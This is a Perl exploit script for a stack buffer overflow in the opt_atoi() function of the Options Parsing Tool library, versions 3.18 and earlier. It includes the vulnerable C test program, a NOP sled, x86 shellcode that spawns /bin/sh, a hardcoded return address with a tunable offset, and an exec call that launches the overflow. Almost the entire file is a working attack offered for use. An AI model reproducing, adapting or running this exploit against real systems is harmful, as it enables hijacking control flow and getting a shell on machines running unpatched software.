#!/usr/bin/perl
#
# expl-optatoi.pl : opt_atoi() function exploit (from Options Parsing
# Tool shared library opt-3.18 and prior) for this vulnerable code.
#
# vuln.c :
#    main(int *argc, char **argv)
#    {
#        /* use OPT opt_atoi() */
#        int y = opt_atoi(argv[1]);
#        printf("opt_atoi(): %i\n", y);
#     }
#
# cc -o vuln vuln.c /path/to/opt-3.18/src/libopt.a
#
# Author :
#    jlanthea [contact@jlanthea.net]
#
# Syntax :
#    perl expl-optatoi.pl <offset>   # works for me with offset = -1090


$shellcode = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89".
             "\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c".
             "\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff".
             "\xff\xff/bin/sh";


$len = 1032;        # The length needed to own EIP.
$ret = 0xbffff6c0;  # The stack pointer at crash time
$nop = "\x90";      # x86 NOP
$offset = 0;    # Default offset to try.


if (@ARGV == 1) {
    $offset = $ARGV[0];
}

for ($i = 0; $i < ($len - length($shellcode) - 100); $i++) {
    $buffer .= $nop;
}

$buffer .= $shellcode;

print("Address: 0x", sprintf('%lx',($ret + $offset)), "\n");

$new_ret = pack('l', ($ret + $offset));

for ($i += length($shellcode); $i < $len; $i += 4) {
    $buffer .= $new_ret;
}

exec("/path/to/vuln $buffer");

